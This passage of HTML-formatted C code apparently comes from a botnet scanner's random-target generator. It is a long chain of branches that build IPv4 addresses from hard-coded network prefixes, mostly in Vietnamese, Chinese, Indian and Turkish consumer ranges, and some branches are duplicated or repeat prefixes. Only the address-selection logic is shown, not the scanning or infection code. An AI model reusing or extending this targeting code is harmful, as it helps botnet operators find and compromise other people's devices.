class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">19</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;27.98.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;36.32.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">21</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;36.248.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">22</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;39.64.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">23</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.253.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">24</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.230.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">25</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;163.53.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">26</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.230.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">27</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.245.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">28</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;123.25.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">29</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.54.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">30</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;27.255.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">31</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.204.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;123.24.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">33</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.191.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">34</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.188.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">34</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.189.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">35</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.160.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">36</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.161.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">37</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.162.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">38</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.163.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">39</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.164.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">40</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.165.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">41</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.166.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">42</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.167.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">43</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.168.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">44</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.169.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">45</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.170.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">46</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.171.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">47</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.172.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">48</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.173.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">49</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.174.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">50</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.175.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">51</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.176.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">52</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.177.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">53</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.178.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">54</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.179.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">55</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.180.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">56</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.181.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">57</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.182.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">58</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.183.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">59</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.184.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">60</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.185.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">61</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.186.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">62</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.187.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">63</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.188.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">64</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.189.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">65</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.190.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">66</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;14.191.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">67</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;45.121.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">68</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;45.120.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">69</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;45.115.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">70</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.252.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">71</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.230.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">72</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.240.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">73</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;43.245.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">74</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;41.174.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">75</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;45.127.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">76</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.30.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">77</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;123.16.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">78</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;202.44.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">79</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;116.93.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">80</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;41.253.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">81</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;117.173.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">82</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.190.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">83</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;112.196.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">84</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.178.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">85</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;112.45.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">86</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;183.223.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">87</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;116.71.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">88</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.44.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">89</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;110.235.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">90</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;124.253.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">91</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;211.237.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">92</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;117.175.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">93</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;117.173.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">94</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;111.9.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">95</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;222.252.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">96</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.174.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">97</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;222.252.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">98</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.160.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">99</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.161.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.162.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">101</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.163.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">102</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.164.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">103</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.165.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">104</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.166.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">105</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.167.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">106</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.168.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">107</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;113.169.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">108</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;123.17.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">109</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;123.21.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">110</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;123.22.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">111</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;222.252.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">112</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;222.253.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">113</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;222.254.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">114</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;222.255.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">115</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;41.208.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">116</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.198.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">117</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;88.248.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">118</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;88.105.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">119</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;88.247.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">120</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;85.105.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">121</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;188.3.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">122</span>)</span><br><span class="line">&#123;</span><br><span class="line">szprintf(ip, <span class="string">&quot;103.203.%d.%d&quot;</span>, ipState[<span class="number">2</span>], ipState[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(randnum == <span class="number">123</span>)</span><br><span 